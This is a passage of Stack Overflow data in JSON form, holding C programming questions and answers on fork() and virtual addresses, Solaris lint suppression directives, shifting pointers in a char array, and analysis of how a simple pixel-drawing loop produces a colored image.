Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 13, "last_activity_date": 1437595145, "creation_date": 1437595145, "answer_id": 31572869, "question_id": 31572782, "link": "https://stackoverflow.com/questions/31572782/variables-after-fork/31572869#31572869", "title": "Variables after fork", "body": "<blockquote>\n  <p>Adresses of variables are same. So they are same. But I change i's value in parent process which is executed first, it didn't change for child process. Why?</p>\n</blockquote>\n\n<p>The addresses are in the scope of a process. They are virtual addresses. Address <code>0x7fffc2490278</code> in the parent process and <code>0x7fffc2490278</code> in the child process are different physical addresses.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4612022"}, "edited": false, "score": 1, "creation_date": 1437595483, "post_id": 31572874, "comment_id": 51100680, "body": "if(-1) will execute. everything is true except 0. but this is just test code, i just hang around. :D It should be pid&gt;0."}], "tags": [], "owner": {"reputation": 796, "user_id": 4920579, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/EGG30.jpg?s=128&g=1", "display_name": "amza", "link": "https://stackoverflow.com/users/4920579/amza"}, "is_accepted": false, "score": 3, "last_activity_date": 1437598252, "last_edit_date": 1437598252, "creation_date": 1437595157, "answer_id": 31572874, "question_id": 31572782, "link": "https://stackoverflow.com/questions/31572782/variables-after-fork/31572874#31572874", "title": "Variables after fork", "body": "<p>From the <a href=\"http://man7.org/linux/man-pages/man2/fork.2.html\" rel=\"nofollow\">man page</a> for fork:</p>\n\n<blockquote>\n  <p>On success, the PID of the child process is returned in the parent,\n         and 0 is returned in the child.  On failure, -1 is returned in the\n         parent, no child process is created, and errno is set appropriately.</p>\n</blockquote>\n\n<p>That is, for the parent pid is being set to a number greater than 0 (or -1 if failure which you should also check for).</p>\n\n<p><code>if(pid)</code> evaluates to <code>if(true)</code></p>\n\n<p>And it will execute for the parent. The child, however, gets 0 assigned to <code>pid</code> (that's how it knows it's the child). </p>\n\n<p><code>if(0)</code> evaluates to <code>if(false)</code></p>\n\n<p>and thus the value of i does not change.</p>\n\n<p>However, because of abstractions the process sees memory in <strong>virtual addresses</strong> (virtual address space which is <em>exactly</em> copied with <code>fork</code>). Only the kernel can manage physical addresses and the process communicates with kernel to get this memory (the process just says <em>\"put this variable <code>i</code> at this address: <code>0x7fffc2490278</code>\"</em> and the kernel will basically map it wherever it wants to). As far as the process knows, it's the only process asking for memory and that's why their addresses are the \"same\".</p>\n"}, {"tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": false, "score": 2, "last_activity_date": 1437598266, "last_edit_date": 1437598266, "creation_date": 1437595558, "answer_id": 31572975, "question_id": 31572782, "link": "https://stackoverflow.com/questions/31572782/variables-after-fork/31572975#31572975", "title": "Variables after fork", "body": "<p>Variables live in the virtual address space of the process. Address space of a process is local to that process. The fact that you see the same address in two processed does not mean that you are accessing the same variable. Not at all.</p>\n\n<p>Address values make sense only within the context of its own process. It makes no sense to compare the addresses from different processes' address spaces.</p>\n\n<p>Variable <code>i</code> in parent process is completely separate from variable <code>i</code> in child process. You changed only one <code>i</code> (the parent's one), which is exactly what you observe in the output.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4612022"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2816, "favorite_count": 1, "accepted_answer_id": 31572869, "answer_count": 4, "score": 5, "last_activity_date": 1602873881, "creation_date": 1437594844, "last_edit_date": 1602873881, "question_id": 31572782, "link": "https://stackoverflow.com/questions/31572782/variables-after-fork", "title": "Variables after fork", "body": "<p>Here is a code:</p>\n<pre><code>int i = 0;\npid_t pid;\nputs(&quot;Hello, World!&quot;);\nputs(&quot;&quot;);\npid = fork();\nif (pid) {\n    i = 42;\n}   \nprintf(&quot;%p\\n&quot;, &amp;i);\nprintf(&quot;%d\\n&quot;, i);\nputs(&quot;&quot;);\n</code></pre>\n<p>And output</p>\n<pre><code>Hello, World!\n\n0x7fffc2490278\n42\n\n0x7fffc2490278\n0\n</code></pre>\n<p>Program print Hello, World! one time, so child process wasn't start from the beginning and it wasn't re-define variables. Adresses of variables are same. So they are same. But I change i's value in parent process which is executed first, it didn't change for child process. Why?</p>\n"}, {"tags": ["c", "solaris", "lint", "solaris-studio"], "comments": [{"owner": {"reputation": 81037, "user_id": 8454, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2NlHs.png?s=128&g=1", "display_name": "Andy Lester", "link": "https://stackoverflow.com/users/8454/andy-lester"}, "edited": false, "score": 0, "creation_date": 1437593658, "post_id": 31572339, "comment_id": 51099647, "body": "Have you tried <code>&#47;*line -eE_CAST_INT_TO_SMALL_INT *&#47;</code>, just substituting the identifier for the error number?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1437597562, "post_id": 31572339, "comment_id": 51102002, "body": "Wondering if OP <i>should</i> suppress these warnings.  Maybe post an example of code with a warning that OP would like to suppress?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1437599236, "post_id": 31572339, "comment_id": 51102877, "body": "@chux - Agreed.  When porting old code to 64-bit, I&#39;d think lint warnings such as <code>E_CAST_INT_TO_SMALL_INT</code> are exactly the kinds of problems that <b>must</b> be fixed, especially if they involve <code>size_t</code> and/or pointer code written by someone who &quot;knows that size_t is an unsigned int&quot;.  That sounds all too likely here."}, {"owner": {"reputation": 3921, "user_id": 46220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc77d5a13726cfd5528da0f809153956?s=128&d=identicon&r=PG", "display_name": "alanc", "link": "https://stackoverflow.com/users/46220/alanc"}, "edited": false, "score": 0, "creation_date": 1437608711, "post_id": 31572339, "comment_id": 51106430, "body": "I&#39;ve never seen the <code>&#47;* line -e511 *&#47;</code> form with Solaris lint before - are you sure those aren&#39;t for another lint product?"}, {"owner": {"reputation": 173, "user_id": 1778316, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/6345d495eddcf86db4886e9ebcef7f4b?s=128&d=identicon&r=PG&f=1", "display_name": "John Moore", "link": "https://stackoverflow.com/users/1778316/john-moore"}, "edited": false, "score": 0, "creation_date": 1437611126, "post_id": 31572339, "comment_id": 51107007, "body": "I tried the /*lint -e... and it did not work. The existing code had a number of lines of that form from ancient history when /*lint -e&lt;number&gt;*/ did work.  I am suppressing the warnings because the particular piece of code will not encounter a case where more than 32 is needed, but is part of a huge code base where it is not worth rewriting tons of code (potentially introducing bugs) in order to make this warning go away naturally."}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1437669747, "post_id": 31572339, "comment_id": 51138604, "body": "Comments like <code>&#47;* lint -e511 *&#47;</code> are used by PC-Lint. AT&amp;T-based lints have used other formats."}], "answers": [{"tags": [], "owner": {"reputation": 173, "user_id": 1778316, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/6345d495eddcf86db4886e9ebcef7f4b?s=128&d=identicon&r=PG&f=1", "display_name": "John Moore", "link": "https://stackoverflow.com/users/1778316/john-moore"}, "is_accepted": false, "score": 3, "last_activity_date": 1437594533, "creation_date": 1437594533, "answer_id": 31572686, "question_id": 31572339, "link": "https://stackoverflow.com/questions/31572339/how-to-suppress-solaris-lint-warning-in-c-in-the-code/31572686#31572686", "title": "How to suppress Solaris lint warning in C in the code", "body": "<p><a href=\"http://docs.oracle.com/cd/E18659_01/html/821-1384/bjaih.html#scrolltoc\" rel=\"nofollow\">Described in Lint Directives Section at this link</a></p>\n\n<p>There are two inline ways to suppress lint warnings for a single line of code - the old way and the recommended new way.</p>\n\n<p>The old way is to use a LINTED comment: <code>/*LINTED*/</code></p>\n\n<p>The new way is to use a lint macro: <code>NOTE(LINTED (msg))</code></p>\n\n<p>The new way also requires including <strong>note.h</strong>.</p>\n"}], "owner": {"reputation": 173, "user_id": 1778316, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/6345d495eddcf86db4886e9ebcef7f4b?s=128&d=identicon&r=PG&f=1", "display_name": "John Moore", "link": "https://stackoverflow.com/users/1778316/john-moore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1079, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1437594533, "creation_date": 1437593383, "question_id": 31572339, "link": "https://stackoverflow.com/questions/31572339/how-to-suppress-solaris-lint-warning-in-c-in-the-code", "title": "How to suppress Solaris lint warning in C in the code", "body": "<p>I need to be able to suppress lint warnings on specific lines of C code, and I would like to do this with in-line directives. This is for a very large body of legacy code that I am porting to 64 bit, and I'd much rather put the directives in the code than in the Makefile that runs lint, as the latter is quite obscure.</p>\n\n<p>The problem is that Solaris lint documentation specifies how to do this for only a few warning types (as far as I can tell).</p>\n\n<p>In the past, the following form was used and the Solaris documentation suggests that this is still allowed, but it doesn't seem to work. Complicating the issue is that the Solaris lint does not give error numbers, but rather uses identifiers like E_CAST_INT_TO_SMALL_INT.</p>\n\n<p>Here is the old way (and there are lots of these in the code already):</p>\n\n<pre><code>/*line -e511*/\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 1, "creation_date": 1437593272, "post_id": 31572217, "comment_id": 51099421, "body": "if you want to access the array element, why are you even fiddling around with a pointer to it? (you can&#39;t change the address of an object anyway.) Why not <code>word[i - 1] = word[i];</code>?"}, {"owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "edited": false, "score": 0, "creation_date": 1437597877, "post_id": 31572217, "comment_id": 51102174, "body": "The error you are getting is saying that the thing on the left side of the equals sign is not a variable and this is correct. &amp;word[i-1] refers to the address of word[i-1] and not to the value of it. Without getting too complicated one way to think about this is that your code tells the compiler to make a temporary variable and assign to this temp thing the address where word[i-1] is stored. This variable ceases to exist at the end of the instruction, so you cannot assign anything to it, that is why you get the error."}], "answers": [{"tags": [], "owner": {"reputation": 1263, "user_id": 2544787, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/dbvVv.jpg?s=128&g=1", "display_name": "Murillo Ferreira", "link": "https://stackoverflow.com/users/2544787/murillo-ferreira"}, "is_accepted": false, "score": 0, "last_activity_date": 1437593270, "creation_date": 1437593270, "answer_id": 31572301, "question_id": 31572217, "link": "https://stackoverflow.com/questions/31572217/reassigning-values-in-a-character-array-of-pointers-to-other-locations-within-th/31572301#31572301", "title": "Reassigning values in a character array of pointers to other locations within that array?", "body": "<p>You already declared an array of pointers, you just have to pass it adress, <code>word[some_index]</code> already hold it.</p>\n\n<pre><code>word[i - 1] = word[i];\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 1067548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7ec2e9a055e5ce4cea0a4fe7e8bcb49?s=128&d=identicon&r=PG", "display_name": "user1067548", "link": "https://stackoverflow.com/users/1067548/user1067548"}, "edited": false, "score": 0, "creation_date": 1437761248, "post_id": 31572392, "comment_id": 51183595, "body": "Thanks, this was my problem.  I was incorrectly accessing the elements in the pointer array and I was not freeing the memory that had already been allocated.  Once I did that it worked.  However, I researched the memmove function you mentioned and found that to be easier to use so went that route instead.  Thanks!"}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 1, "last_activity_date": 1437593985, "last_edit_date": 1437593985, "creation_date": 1437593592, "answer_id": 31572392, "question_id": 31572217, "link": "https://stackoverflow.com/questions/31572217/reassigning-values-in-a-character-array-of-pointers-to-other-locations-within-th/31572392#31572392", "title": "Reassigning values in a character array of pointers to other locations within that array?", "body": "<p>First of all it is not clear whether these pointers were dynamically allocated. If they were dynamically allocated and the array is the owner of the pointers then the code will look like</p>\n\n<pre><code>free( word[1] );\nfor (int i = 2; i &lt; m-&gt;words_in_msg; i++)\n{\n     word[i - 1] = word[i];\n}\n</code></pre>\n\n<p>If the pointers were not dynamically allocated or the array is not the owner of the pointers then you may write simply</p>\n\n<pre><code>for (int i = 2; i &lt; m-&gt;words_in_msg; i++)\n{\n     word[i - 1] = word[i];\n}\n</code></pre>\n\n<p>Take into account that you could use standard function <code>memmove</code> declared in header <code>&lt;string.h&gt;</code></p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 1067548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7ec2e9a055e5ce4cea0a4fe7e8bcb49?s=128&d=identicon&r=PG", "display_name": "user1067548", "link": "https://stackoverflow.com/users/1067548/user1067548"}, "edited": false, "score": 0, "creation_date": 1437761372, "post_id": 31572409, "comment_id": 51183675, "body": "The assignment is to the left side of the assignment operator.  Ie, the element in position i is assigned to i - 1.  If you walk forward assigning the previous element to the element in the current position I don&#39;t believe that you do write over the current element until it has been stored in the i - 1 position."}, {"owner": {"reputation": 21, "user_id": 4142844, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-BSRz2uMKR_U/AAAAAAAAAAI/AAAAAAAAABA/ST7n12rGelU/photo.jpg?sz=128", "display_name": "Grace Sun", "link": "https://stackoverflow.com/users/4142844/grace-sun"}, "reply_to_user": {"reputation": 31, "user_id": 1067548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7ec2e9a055e5ce4cea0a4fe7e8bcb49?s=128&d=identicon&r=PG", "display_name": "user1067548", "link": "https://stackoverflow.com/users/1067548/user1067548"}, "edited": false, "score": 0, "creation_date": 1438025470, "post_id": 31572409, "comment_id": 51267991, "body": "Yeah, you are write. My mistake."}], "tags": [], "owner": {"reputation": 21, "user_id": 4142844, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-BSRz2uMKR_U/AAAAAAAAAAI/AAAAAAAAABA/ST7n12rGelU/photo.jpg?sz=128", "display_name": "Grace Sun", "link": "https://stackoverflow.com/users/4142844/grace-sun"}, "is_accepted": false, "score": 0, "last_activity_date": 1437593671, "creation_date": 1437593671, "answer_id": 31572409, "question_id": 31572217, "link": "https://stackoverflow.com/questions/31572217/reassigning-values-in-a-character-array-of-pointers-to-other-locations-within-th/31572409#31572409", "title": "Reassigning values in a character array of pointers to other locations within that array?", "body": "<p>If you want to put each element to the next position, you shouldn't iterate from first to last. Otherwise, you'll overwrite the element in the next position before moving it.</p>\n"}], "owner": {"reputation": 31, "user_id": 1067548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7ec2e9a055e5ce4cea0a4fe7e8bcb49?s=128&d=identicon&r=PG", "display_name": "user1067548", "link": "https://stackoverflow.com/users/1067548/user1067548"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "accepted_answer_id": 31572392, "answer_count": 3, "score": -1, "last_activity_date": 1437593985, "creation_date": 1437592948, "question_id": 31572217, "link": "https://stackoverflow.com/questions/31572217/reassigning-values-in-a-character-array-of-pointers-to-other-locations-within-th", "title": "Reassigning values in a character array of pointers to other locations within that array?", "body": "<p>In C how do I assign location [i-1] in a char array of pointers to location i in that same array?</p>\n\n<p>For instance, say I have declared <code>char *word[m-&gt;words_in_msg+1];</code></p>\n\n<p>If I wanted to assign the location of i-1 to i how would I do that?  I currently have a for loop as such:</p>\n\n<pre><code>    for (int i = 2; i &lt; m-&gt;words_in_msg; i++){\n         &amp;word[i - 1] = &amp;word[i];\n    }\n</code></pre>\n\n<p>However, this is giving me the compile error \"lvalue required as left operand of assignment\".  I think this is because it is reading the left hand side <code>&amp;word[i - 1]</code> as a pointer location instead of a value but I'm not sure how I would tell it that the value stored in that location is what I want to reassign.  </p>\n\n<p>Any help is appreciated, thanks!  The C pointer mechanics are not strong with this one. : P</p>\n"}, {"tags": ["c", "image", "graphics", "drawing", "draw"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437590127, "post_id": 31571291, "comment_id": 51097385, "body": "The short code is using the <code>distance</code> function, which is doing most of the work."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437590194, "post_id": 31571291, "comment_id": 51097423, "body": "Perhaps yes.. but what happens behind the code is kinda curious though. And the result.. can&#39;t figure it out."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1437590260, "post_id": 31571291, "comment_id": 51097469, "body": "It is nice. But I don&#39;t see much of question here. Mandelbrot fractal code is fairly simple as well."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1437593687, "post_id": 31571291, "comment_id": 51099661, "body": "The comment shows that red and green come from x and y coordinate. For blue, you&#39;ll need to look at the function <code>distance()</code>, but it&#39;s a fair guess to suppose that blue comes from radial distance and is cropped at 255. The image size is 514x514, with a border of 1 that is 512 by 512. So the colours suffer a step change as the coordinate passes from 255 to 256 (mod 256)."}], "answers": [{"tags": [], "owner": {"reputation": 1482, "user_id": 297216, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e1d89c8b79c5991c01b0f81c731970f5?s=128&d=identicon&r=PG", "display_name": "Cobusve", "link": "https://stackoverflow.com/users/297216/cobusve"}, "is_accepted": false, "score": 1, "last_activity_date": 1437626620, "creation_date": 1437626620, "answer_id": 31578316, "question_id": 31571291, "link": "https://stackoverflow.com/questions/31571291/understanding-the-way-a-figure-is-drawn/31578316#31578316", "title": "Understanding the way a figure is drawn", "body": "<p>This code draws one pixel at a time just as you noticed, and it is indeed a mystery as we do not have the content of the setpen, or the distance functions.</p>\n\n<p>To understand how such a simple code could produce such a complex image you have to first remember that a function as simple as getPixelColor(x,y) could draw any possible image you could imagine by reading each pixel from a file. By hiding the details like this pictures of arbitrary complexity can be created with simple code.</p>\n\n<p>This concept is quite important in computer science and is called \"abstraction\". What this means is that we hide the details of how pixel color is selected inside a function which is implemented elsewhere and accessed in a seemingly simple way.</p>\n\n<p>If you wanted to draw different types of images you could just change the function which fetches each pixel and by doing this change between different images.</p>\n\n<p>You could try to play with this by replacing the current functions with a function which sets the color using an equation - something like sin(x) for red, sin(y) for green and cos(x) for blue would give you a fairly interesting result with a pretty simple function.</p>\n\n<p>Like somebody else mentioned you can also look into fractals. The Mandelbrot set is an interesting implementation where the equation to determine the pixel is similar to x=(x-1)^2+C.</p>\n\n<p><a href=\"http://mathworld.wolfram.com/MandelbrotSet.html\" rel=\"nofollow\">http://mathworld.wolfram.com/MandelbrotSet.html</a></p>\n"}, {"comments": [{"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437634625, "post_id": 31580110, "comment_id": 51113898, "body": "I decided to experiment a little bit and guess what came up if each of the values uses the distance function."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437634734, "post_id": 31580110, "comment_id": 51113960, "body": "The other answer suggests using trig functions like <code>sin</code>, of course it will have to be <code>255 * sin(x)</code> with <code>x</code> scaled appropriately from <code>h</code>. Or perhaps <code>127 + 127*sin(x)</code>."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437634860, "post_id": 31580110, "comment_id": 51114022, "body": "<a href=\"http://vegasoft.site90.com/drawing.png\" rel=\"nofollow noreferrer\">vegasoft.site90.com/drawing.png</a> this appears when rgb obtains value from distance. While it looks identical, it appears that it simplifies the understanding as it makes it color independent."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437634964, "post_id": 31580110, "comment_id": 51114079, "body": "Before I look I will take a guess: a greyscale image fading from black at the centre to white, with a circular step to black and the fading again towards white."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437635017, "post_id": 31580110, "comment_id": 51114108, "body": "Almost exact. It fades from white at the center to black."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437635075, "post_id": 31580110, "comment_id": 51114137, "body": "Not on the one I am looking at in your link: black at the centre."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437635117, "post_id": 31580110, "comment_id": 51114164, "body": "Yes. The center is fully black. Oh you mean from black to center like Inside Out"}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1437635718, "post_id": 31580110, "comment_id": 51114504, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/84040/discussion-between-malina-and-weather-vane\">continue this discussion in chat</a>."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437635746, "post_id": 31580110, "comment_id": 51114525, "body": "(Ignore the chat invitation) By the way for the sake of argument isn&#39;t <code>sqrt</code> the math function for square root ?"}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437636061, "post_id": 31580110, "comment_id": 51114712, "body": "distance: Returns the distance between points (x1, y1) and (x2, y2). <code>double distance(double x1, double y1, double x2, double y2)</code>"}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 2, "last_activity_date": 1437635458, "last_edit_date": 1437635458, "creation_date": 1437634308, "answer_id": 31580110, "question_id": 31571291, "link": "https://stackoverflow.com/questions/31571291/understanding-the-way-a-figure-is-drawn/31580110#31580110", "title": "Understanding the way a figure is drawn", "body": "<p>There is no mystery here, as analysis of the image and a little observation show.</p>\n\n<p>Firstly, the image size is 514 x 514, removing the border this gives the effective size as 512 x 512.</p>\n\n<p>The comment in the code at <code>setpen()</code> indicates the first three arguments set the colour levels of red, green and blue. The next is transparency, set to 0. The last argument is pen size, set to 1 so no pixel written will affect any neighbour.</p>\n\n<p>Ignoring the blue component for now, the red and green arguments are passed the pixel coordinates. Since the colour range is 0..255 and the coordinate range is 0..511, red and green will each \"wrap\" twice to produce four identical tiles. Each of the tiles (as you can see) will fade from red (255,0,b) to green (0,255,b) along one diagonal, and from black (0,0,b) to yellow (255,255,b) along the other diagonal. Where each tile joins, the coordinate passes from 255 to 256, making the colour value step from 255 to 0.</p>\n\n<p>Now let's add blue. My eyes tell me that the blue component increases radially outward from the centre, and again there is a step change at radius 256. I detect a hint of dark blue at the top left corner of the image (where is should be black), and using the \"dropper\" tool in a graphics utility shows that the blue level in the very corner is 104.</p>\n\n<p>So now I will reverse-engineer the <code>distance</code> function.</p>\n\n<pre><code>int distance(int x, int y, int ox, int oy) {\n    int dx = x - ox;\n    int dy = y - oy;\n    return (int)sqroot(dx * dx + dy * dy);\n}\n</code></pre>\n\n<p>Now testing this to see what it returns at (0, 0)</p>\n\n<pre><code>dx = 0 - 255\ndy = 0 - 255\nreturn 360\n</code></pre>\n\n<p>Since the pixel colour will be <code>mod 256</code>, the <code>360</code> blue will be plotted as (360 - 256) = 104.</p>\n\n<p>Finally, notice that the circle does not quite reach the border along the right and bottom edges, there is a 1-pixel wide strip. This is due to the fact that the circle centre was passed to <code>distance</code> as <code>255</code>, and the image size is an even number of pixels, so there is no exact centre.</p>\n\n<p>QED</p>\n"}], "owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 1, "accepted_answer_id": 31580110, "answer_count": 2, "score": 0, "last_activity_date": 1437635458, "creation_date": 1437590041, "question_id": 31571291, "link": "https://stackoverflow.com/questions/31571291/understanding-the-way-a-figure-is-drawn", "title": "Understanding the way a figure is drawn", "body": "<p><a 